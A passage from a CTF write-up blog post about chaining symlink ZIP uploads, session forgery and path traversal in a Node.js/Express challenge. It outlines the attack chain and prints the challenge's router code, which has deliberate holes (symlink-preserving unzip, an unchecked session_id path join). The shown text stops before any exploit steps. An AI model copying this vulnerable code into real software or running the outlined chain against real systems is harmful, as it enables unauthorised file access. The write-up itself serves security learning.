<!doctype html><html lang=en-US><head><meta http-equiv=X-Clacks-Overhead content="GNU Terry Pratchett"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" href=https://awwfensive.site/favicon.png><title>Exploiting Symlink Upload and Session Forgery | aniket/awwfensive</title><meta name=title content="Exploiting Symlink Upload and Session Forgery"><meta name=description content="
  Table Of Contents
  
  
    Introduction
      
        Attack Chain Overview
      
    
    Initial Reconnaissance
      
        Technology Stack
      
    
    Source Code Analysis
      
        Main Router (index.js)
      
    
    Vulnerability Analysis
      
        Vulnerability #1: Symlink Preservation in ZIP Extraction
        Vulnerability #2: Path Traversal in Debug Endpoint
        Vulnerability #3: Weak Authentication Bypass
        Vulnerability #4: Session Secret Exposure
      
    
    Exploitation Strategy
    Step-by-Step Exploitation
      
        Step 1: Creating Malicious Symlinks
        Step 2: Uploading and Extracting Symlinks
        Step 3: Downloading Symlinked Files
        Step 4: Forging the Developer Session Cookie
        Step 5: Accessing the Debug Endpoint
        Step 6: Capturing the Flag
      
    
  


Introduction
During TFC 2025 CTF, I encountered a fascinating web challenge that showcased how multiple seemingly minor vulnerabilities can be chained together to achieve complete system compromise. The application appeared simple on the surface: upload a ZIP file, extract it, and serve the contents for download. However, beneath this straightforward functionality lurked a perfect storm of security issues."><meta name=keywords content><meta property="og:url" content="https://awwfensive.site/exploiting-symlink-upload-and-session-forgery/"><meta property="og:site_name" content="aniket/awwfensive"><meta property="og:title" content="Exploiting Symlink Upload and Session Forgery"><meta property="og:description" content="Table Of Contents Introduction Attack Chain Overview Initial Reconnaissance Technology Stack Source Code Analysis Main Router (index.js) Vulnerability Analysis Vulnerability #1: Symlink Preservation in ZIP Extraction Vulnerability #2: Path Traversal in Debug Endpoint Vulnerability #3: Weak Authentication Bypass Vulnerability #4: Session Secret Exposure Exploitation Strategy Step-by-Step Exploitation Step 1: Creating Malicious Symlinks Step 2: Uploading and Extracting Symlinks Step 3: Downloading Symlinked Files Step 4: Forging the Developer Session Cookie Step 5: Accessing the Debug Endpoint Step 6: Capturing the Flag Introduction During TFC 2025 CTF, I encountered a fascinating web challenge that showcased how multiple seemingly minor vulnerabilities can be chained together to achieve complete system compromise. The application appeared simple on the surface: upload a ZIP file, extract it, and serve the contents for download. However, beneath this straightforward functionality lurked a perfect storm of security issues."><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="article:section" content="blog"><meta property="article:published_time" content="2025-09-01T00:00:00+00:00"><meta property="article:modified_time" content="2025-09-01T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Exploiting Symlink Upload and Session Forgery"><meta name=twitter:description content="Table Of Contents Introduction Attack Chain Overview Initial Reconnaissance Technology Stack Source Code Analysis Main Router (index.js) Vulnerability Analysis Vulnerability #1: Symlink Preservation in ZIP Extraction Vulnerability #2: Path Traversal in Debug Endpoint Vulnerability #3: Weak Authentication Bypass Vulnerability #4: Session Secret Exposure Exploitation Strategy Step-by-Step Exploitation Step 1: Creating Malicious Symlinks Step 2: Uploading and Extracting Symlinks Step 3: Downloading Symlinked Files Step 4: Forging the Developer Session Cookie Step 5: Accessing the Debug Endpoint Step 6: Capturing the Flag Introduction During TFC 2025 CTF, I encountered a fascinating web challenge that showcased how multiple seemingly minor vulnerabilities can be chained together to achieve complete system compromise. The application appeared simple on the surface: upload a ZIP file, extract it, and serve the contents for download. However, beneath this straightforward functionality lurked a perfect storm of security issues."><meta itemprop=name content="Exploiting Symlink Upload and Session Forgery"><meta itemprop=description content="Table Of Contents Introduction Attack Chain Overview Initial Reconnaissance Technology Stack Source Code Analysis Main Router (index.js) Vulnerability Analysis Vulnerability #1: Symlink Preservation in ZIP Extraction Vulnerability #2: Path Traversal in Debug Endpoint Vulnerability #3: Weak Authentication Bypass Vulnerability #4: Session Secret Exposure Exploitation Strategy Step-by-Step Exploitation Step 1: Creating Malicious Symlinks Step 2: Uploading and Extracting Symlinks Step 3: Downloading Symlinked Files Step 4: Forging the Developer Session Cookie Step 5: Accessing the Debug Endpoint Step 6: Capturing the Flag Introduction During TFC 2025 CTF, I encountered a fascinating web challenge that showcased how multiple seemingly minor vulnerabilities can be chained together to achieve complete system compromise. The application appeared simple on the surface: upload a ZIP file, extract it, and serve the contents for download. However, beneath this straightforward functionality lurked a perfect storm of security issues."><meta itemprop=datePublished content="2025-09-01T00:00:00+00:00"><meta itemprop=dateModified content="2025-09-01T00:00:00+00:00"><meta itemprop=wordCount content="1544"><meta name=referrer content="no-referrer-when-downgrade"><style>:root{--width:720px;--font-main:Verdana, sans-serif;--font-secondary:Verdana, sans-serif;--font-scale:1em;--background-color:#fff;--heading-color:#222;--text-color:#444;--link-color:#3273dc;--visited-color:#8b6fcb;--blockquote-color:#222}@media(prefers-color-scheme:dark){:root{--background-color:#01242e;--heading-color:#eee;--text-color:#ddd;--link-color:#8cc2dd;--visited-color:#8b6fcb;--blockquote-color:#ccc}}body{font-family:var(--font-secondary);font-size:var(--font-scale);margin:auto;padding:20px;max-width:var(--width);text-align:left;background-color:var(--background-color);word-wrap:break-word;overflow-wrap:break-word;line-height:1.5;color:var(--text-color)}h1,h2,h3,h4,h5,h6{font-family:var(--font-main);color:var(--heading-color)}a{color:var(--link-color);cursor:pointer;text-decoration:none}a:hover{text-decoration:underline}nav a{margin-right:8px}strong,b{color:var(--heading-color)}button{margin:0;cursor:pointer}time{font-family:monospace;font-style:normal;font-size:15px}main{line-height:1.6}table{width:100%}hr{border:0;border-top:1px dashed}img{max-width:100%}code{font-family:monospace;padding:2px;border-radius:3px}blockquote{border-left:1px solid #999;color:var(--blockquote-color);padding-left:20px;font-style:italic}footer{padding:25px 0;text-align:center}.title:hover{text-decoration:none}.title h1{font-size:1.5em}.inline{width:auto!important}.highlight,.code{border-radius:3px;margin-block-start:1em;margin-block-end:1em;overflow-x:auto}ul.blog-posts{list-style-type:none;padding:unset}ul.blog-posts li{display:flex}ul.blog-posts li span{flex:0 0 130px}ul.blog-posts li a:visited{color:var(--visited-color)}</style><script src=https://cdn.jsdelivr.net/gh/adryd325/oneko.js@latest/oneko.js defer data-cat=/oneko.gif></script><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;500;700&display=swap" rel=stylesheet><style>:root{--bg:#ffffff;--text:#000000;--link:#ff6666}@media(prefers-color-scheme:light){:root{--bg:#ffffff;--text:#000000;--link:#ff6666}}::selection{background-color:#b3d9ff;color:#000}::-moz-selection{background-color:#b3d9ff;color:#000}body{background-color:#fff;color:#333;font-family:roboto mono,monospace;line-height:1.6;font-size:1em;max-width:720px;margin:0 auto;padding:20px}h1,h2,h3,h4,h5,h6,p,li,span,div{color:#000!important;font-family:roboto mono,monospace}strong,b,em,i,mark{color:#000!important}h1{font-size:2em;line-height:1.2}h2{font-size:1.5em;margin-top:2rem}h3{font-size:1.2em;margin-top:1.5rem}header h1,header h1 a,header a.title,body>header>h1,body>header>h1>a{color:#000!important;text-decoration:none!important;font-size:1.1em;font-family:roboto mono,monospace}header h1 a:hover{color:#000!important}article h1,article h2,main h1,main h2{color:#000!important}a{color:#000!important;text-decoration:none!important;border-bottom:2.5px solid #f66;padding-bottom:2px}a:hover{color:#000!important;border-bottom-color:#ff4d4d}header h1 a{text-decoration:none!important}header nav a{margin-right:1.5rem}time,.date{color:#5f7bdc!important}#theme-toggle{color:var(--link)!important;text-decoration:none!important;font-size:1.2em;cursor:pointer;transition:opacity .2s ease;display:inline-block;margin-left:1.5rem}#theme-toggle:hover{opacity:.7}header{border-bottom:1px solid #e0e0e0;padding-bottom:1rem;margin-bottom:2rem}footer{border-top:none;padding-top:1rem;margin-top:3rem}.blog-posts article{border-bottom:1px solid #e0e0e0;padding-bottom:1rem;margin-bottom:1rem}.blog-posts article:last-child{border-bottom:none}.highlight{margin:1.5rem 0}.highlight pre{background-color:#f5f5f5!important;color:#333!important;padding:1.25rem 1.5rem;border-radius:12px;overflow-x:auto;line-height:1.6;border:1px solid #e5e5e5}.highlight pre::-webkit-scrollbar{height:8px;border-radius:0 0 12px 12px}.highlight pre::-webkit-scrollbar-track{background-color:#f5f5f5;border-radius:0 0 12px 12px}.highlight pre::-webkit-scrollbar-thumb{background-color:#ccc;border-radius:4px}.highlight pre::-webkit-scrollbar-thumb:hover{background-color:#aaa}.highlight pre{scrollbar-width:thin;scrollbar-color:#ccc #f5f5f5}.highlight pre code,.highlight code{background:0 0!important;color:inherit!important;padding:0;font-size:.9em}code{font-family:roboto mono,courier new,monospace;font-size:.9em}p code,li code,h1 code,h2 code,h3 code{background-color:#f0f0f0!important;color:#c00!important;padding:2px 6px;border-radius:6px;font-size:.9em}.highlight .c,.highlight .cm,.highlight .c1,.highlight .cs,.highlight .sd{color:green!important;font-style:italic}.highlight .cp{color:green!important}.highlight .err,.highlight .gd,.highlight .gr,.highlight .gt,.highlight .ne{color:#e60000!important}.highlight .k,.highlight .kc,.highlight .kp,.highlight .kr{color:#af00db!important}.highlight .kd,.highlight .kn,.highlight .kt{color:#06c!important}.highlight .o,.highlight .ow,.highlight .w{color:#333!important}.highlight .ge{color:#333;font-style:italic}.highlight .gh,.highlight .gp,.highlight .gu{color:#06c!important;font-weight:700}.highlight .gi{color:green!important}.highlight .go{color:#666!important}.highlight .gs{color:#333;font-weight:700}.highlight .m,.highlight .mb,.highlight .mf,.highlight .mh,.highlight .mi,.highlight .mo,.highlight .il{color:#f60!important}.highlight .s,.highlight .sa,.highlight .sb,.highlight .sc,.highlight .dl,.highlight .s2,.highlight .sh,.highlight .si,.highlight .sx,.highlight .sr,.highlight .s1,.highlight .ss{color:#c41a16!important}.highlight .se{color:#af00db!important}.highlight .na,.highlight .nb,.highlight .ni,.highlight .nv,.highlight .bp,.highlight .vc,.highlight .vg,.highlight .vi,.highlight .vm{color:#06c!important}.highlight .nc,.highlight .nn,.highlight .nt{color:teal!important}.highlight .no{color:#f60!important}.highlight .nd,.highlight .nf,.highlight .fm{color:#06c!important}.highlight .nl{color:#06c!important}#TableOfContents{background-color:initial;border:none;padding:0;margin:2rem 0;border-radius:0}#TableOfContents{background-color:initial;border:none;padding:0;margin:2rem 0;border-radius:0}#TableOfContents ul{list-style:disc;padding-left:2rem;margin:.5rem 0}#TableOfContents>ul{padding-left:2rem}#TableOfContents ul ul{list-style:circle;padding-left:2rem}#TableOfContents li{margin:.5rem 0}#TableOfContents a{color:#000!important;text-decoration:none!important;border-bottom:2.5px solid #f66!important;padding-bottom:2px}#TableOfContents a:hover{color:#000!important;border-bottom-color:#ff4d4d!important}table{width:100%;border-collapse:collapse;margin:1.5rem 0;background-color:#fff}table th,table td{padding:.75rem;text-align:left;border:1px solid #d0d0d0}table th{background-color:#f9f9f9;font-weight:700;color:#000}table code{background-color:#f0f0f0;padding:2px 6px;border-radius:3px;color:#c00}figure{margin:1.5rem 0}figure img,.clickable-img{max-width:100%;width:100%;height:auto;display:block;cursor:pointer;transition:opacity .2s ease}figure img:hover,.clickable-img:hover{opacity:.8}.lightbox-modal{display:none;position:fixed;z-index:9999;left:0;top:0;width:100%;height:100%;background-color:rgba(0,0,0,.8);animation:fadeIn .3s}.lightbox-modal.active{display:flex;align-items:center;justify-content:center}.lightbox-content{position:relative;max-width:90%;max-height:90vh;animation:zoomIn .3s}.lightbox-content img{max-width:100%;max-height:85vh;width:auto;height:auto}.lightbox-close{position:absolute;top:-30px;right:0;color:#fff;font-size:28px;font-weight:700;cursor:pointer;user-select:none}.lightbox-close:hover{color:#ccc}@keyframes fadeIn{from{opacity:0}to{opacity:1}}@keyframes zoomIn{from{transform:scale(.8)}to{transform:scale(1)}}</style><script>document.addEventListener("DOMContentLoaded",function(){const e=document.createElement("div");e.className="lightbox-modal",e.innerHTML='<div class="lightbox-content"><span class="lightbox-close">&times;</span><img id="lightbox-img" src="" alt=""></div>',document.body.appendChild(e),document.querySelectorAll("figure img").forEach(t=>{t.style.cursor="pointer",t.addEventListener("click",function(){document.getElementById("lightbox-img").src=this.src,e.classList.add("active")})}),document.querySelector(".lightbox-close").addEventListener("click",function(){e.classList.remove("active")}),e.addEventListener("click",function(e){e.target===this&&this.classList.remove("active")}),document.addEventListener("keydown",function(t){t.key==="Escape"&&e.classList.remove("active")})})</script></head><body><header><a href=/ class=title><h2>aniket/awwfensive</h2></a><nav><a href=/>Home</a>
<a href=/blog/>Blog</a>
<a href=/projects/>Projects</a></nav></header><main><h1>Exploiting Symlink Upload and Session Forgery</h1><p><i><time datetime=2025-09-01>01 Sep, 2025</time></i></p><content><div class=toc><h3>Table Of Contents</h3><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a><ul><li><a href=#attack-chain-overview>Attack Chain Overview</a></li></ul></li><li><a href=#initial-reconnaissance>Initial Reconnaissance</a><ul><li><a href=#technology-stack>Technology Stack</a></li></ul></li><li><a href=#source-code-analysis>Source Code Analysis</a><ul><li><a href=#main-router-indexjs>Main Router (index.js)</a></li></ul></li><li><a href=#vulnerability-analysis>Vulnerability Analysis</a><ul><li><a href=#vulnerability-1-symlink-preservation-in-zip-extraction>Vulnerability #1: Symlink Preservation in ZIP Extraction</a></li><li><a href=#vulnerability-2-path-traversal-in-debug-endpoint>Vulnerability #2: Path Traversal in Debug Endpoint</a></li><li><a href=#vulnerability-3-weak-authentication-bypass>Vulnerability #3: Weak Authentication Bypass</a></li><li><a href=#vulnerability-4-session-secret-exposure>Vulnerability #4: Session Secret Exposure</a></li></ul></li><li><a href=#exploitation-strategy>Exploitation Strategy</a></li><li><a href=#step-by-step-exploitation>Step-by-Step Exploitation</a><ul><li><a href=#step-1-creating-malicious-symlinks>Step 1: Creating Malicious Symlinks</a></li><li><a href=#step-2-uploading-and-extracting-symlinks>Step 2: Uploading and Extracting Symlinks</a></li><li><a href=#step-3-downloading-symlinked-files>Step 3: Downloading Symlinked Files</a></li><li><a href=#step-4-forging-the-developer-session-cookie>Step 4: Forging the Developer Session Cookie</a></li><li><a href=#step-5-accessing-the-debug-endpoint>Step 5: Accessing the Debug Endpoint</a></li><li><a href=#step-6-capturing-the-flag>Step 6: Capturing the Flag</a></li></ul></li></ul></nav></div><h2 id=introduction>Introduction</h2><p>During TFC 2025 CTF, I encountered a fascinating web challenge that showcased how multiple seemingly minor vulnerabilities can be chained together to achieve complete system compromise. The application appeared simple on the surface: upload a ZIP file, extract it, and serve the contents for download. However, beneath this straightforward functionality lurked a perfect storm of security issues.</p><p>This writeup demonstrates a complete exploit chain combining symlink traversal, path traversal, session forgery, and authentication bypass. What makes this particularly interesting is how each vulnerability alone might seem insignificant, but together they create a devastating attack vector.</p><h3 id=attack-chain-overview>Attack Chain Overview</h3><ol><li>Upload ZIP containing symlinks to sensitive files</li><li>Extract session secret and development session ID</li><li>Forge developer session cookie</li><li>Bypass 403 restrictions using X-Forwarded-For header</li><li>Exploit path traversal in debug endpoint</li><li>Access arbitrary files including the flag</li></ol><hr><h2 id=initial-reconnaissance>Initial Reconnaissance</h2><p>The target application is a Node.js/Express web server that provides file upload and management functionality. Users can upload ZIP files which are automatically extracted and made available for download through a personalized directory structure based on their session ID.</p><p><strong>Key Functionality:</strong> The application uses session-based isolation to separate user files. Each user gets their own directory under <code>/uploads/&lt;userId></code>, and the app attempts to prevent users from accessing other users&rsquo; files through path traversal protection.</p><h3 id=technology-stack>Technology Stack</h3><ul><li><strong>Runtime:</strong> Node.js with Express.js framework</li><li><strong>File Handling:</strong> Multer for uploads, native <code>execFile</code> for unzipping</li><li><strong>Session Management:</strong> express-session with MemoryStore</li><li><strong>Environment Config:</strong> dotenv for environment variables</li></ul><hr><h2 id=source-code-analysis>Source Code Analysis</h2><p>Let&rsquo;s dive deep into the application source code to identify the vulnerabilities. I&rsquo;ll analyze each component systematically, starting with the main routing logic.</p><h3 id=main-router-indexjs>Main Router (index.js)</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>multer</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;multer&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>path</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=p>{</span> <span class=nx>execFile</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;child_process&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>fs</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;fs&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>ensureSession</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;../middleware/session&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>developmentOnly</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;../middleware/developmentOnly&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>router</span> <span class=o>=</span> <span class=nx>express</span><span class=p>.</span><span class=nx>Router</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>router</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>ensureSession</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>upload</span> <span class=o>=</span> <span class=nx>multer</span><span class=p>({</span> <span class=nx>dest</span><span class=o>:</span> <span class=s1>&#39;/tmp&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>res</span><span class=p>.</span><span class=nx>render</span><span class=p>(</span><span class=s1>&#39;index&#39;</span><span class=p>,</span> <span class=p>{</span> <span class=nx>sessionId</span><span class=o>:</span> <span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>userId</span> <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/upload&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>res</span><span class=p>.</span><span class=nx>render</span><span class=p>(</span><span class=s1>&#39;upload&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>router</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/upload&#39;</span><span class=p>,</span> <span class=nx>upload</span><span class=p>.</span><span class=nx>single</span><span class=p>(</span><span class=s1>&#39;zipfile&#39;</span><span class=p>),</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>zipPath</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>file</span><span class=p>.</span><span class=nx>path</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>userDir</span> <span class=o>=</span> <span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s1>&#39;../uploads&#39;</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>userId</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=nx>fs</span><span class=p>.</span><span class=nx>mkdirSync</span><span class=p>(</span><span class=nx>userDir</span><span class=p>,</span> <span class=p>{</span> <span class=nx>recursive</span><span class=o>:</span> <span class=kc>true</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=c1>// Command: unzip temp/file.zip -d target_dir
</span></span></span><span class=line><span class=cl>    <span class=nx>execFile</span><span class=p>(</span><span class=s1>&#39;unzip&#39;</span><span class=p>,</span> <span class=p>[</span><span class=nx>zipPath</span><span class=p>,</span> <span class=s1>&#39;-d&#39;</span><span class=p>,</span> <span class=nx>userDir</span><span class=p>],</span> <span class=p>(</span><span class=nx>err</span><span class=p>,</span> <span class=nx>stdout</span><span class=p>,</span> <span class=nx>stderr</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>fs</span><span class=p>.</span><span class=nx>unlinkSync</span><span class=p>(</span><span class=nx>zipPath</span><span class=p>);</span> <span class=c1>// Clean up temp file
</span></span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>(</span><span class=s1>&#39;Unzip failed:&#39;</span><span class=p>,</span> <span class=nx>stderr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;Unzip error&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>      <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s1>&#39;/files&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/files&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>userDir</span> <span class=o>=</span> <span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s1>&#39;../uploads&#39;</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>userId</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>fs</span><span class=p>.</span><span class=nx>readdir</span><span class=p>(</span><span class=nx>userDir</span><span class=p>,</span> <span class=p>(</span><span class=nx>err</span><span class=p>,</span> <span class=nx>files</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;Error reading files&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>render</span><span class=p>(</span><span class=s1>&#39;files&#39;</span><span class=p>,</span> <span class=p>{</span> <span class=nx>files</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/files/:filename&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>userDir</span> <span class=o>=</span> <span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s1>&#39;../uploads&#39;</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>userId</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>requestedPath</span> <span class=o>=</span> <span class=nx>path</span><span class=p>.</span><span class=nx>normalize</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>filePath</span> <span class=o>=</span> <span class=nx>path</span><span class=p>.</span><span class=nx>resolve</span><span class=p>(</span><span class=nx>userDir</span><span class=p>,</span> <span class=nx>requestedPath</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=c1>// Prevent path traversal
</span></span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>filePath</span><span class=p>.</span><span class=nx>startsWith</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nx>resolve</span><span class=p>(</span><span class=nx>userDir</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;Invalid file path&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>fs</span><span class=p>.</span><span class=nx>existsSync</span><span class=p>(</span><span class=nx>filePath</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>statSync</span><span class=p>(</span><span class=nx>filePath</span><span class=p>).</span><span class=nx>isFile</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>res</span><span class=p>.</span><span class=nx>download</span><span class=p>(</span><span class=nx>filePath</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>404</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;File not found&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>router</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/debug/files&#39;</span><span class=p>,</span> <span class=nx>developmentOnly</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>userDir</span> <span class=o>=</span> <span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s1>&#39;../uploads&#39;</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>session_id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>fs</span><span class=p>.</span><span class=nx>readdir</span><span class=p>(</span><span class=nx>userDir</span><span class=p>,</span> <span class=p>(</span><span class=nx>err</span><span class=p>,</span> <span class=nx>files</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;Error reading files&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>render</span><span class=p>(</span><span class=s1>&#39;files&#39;</span><span class=p>,</span> <span class=p>{</span> <span class=nx>files</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>module</span><span class=p>.</span><span class=nx>exports</span> <span class=o>=</span> <span class=nx>router</span><span class=p>;</span>
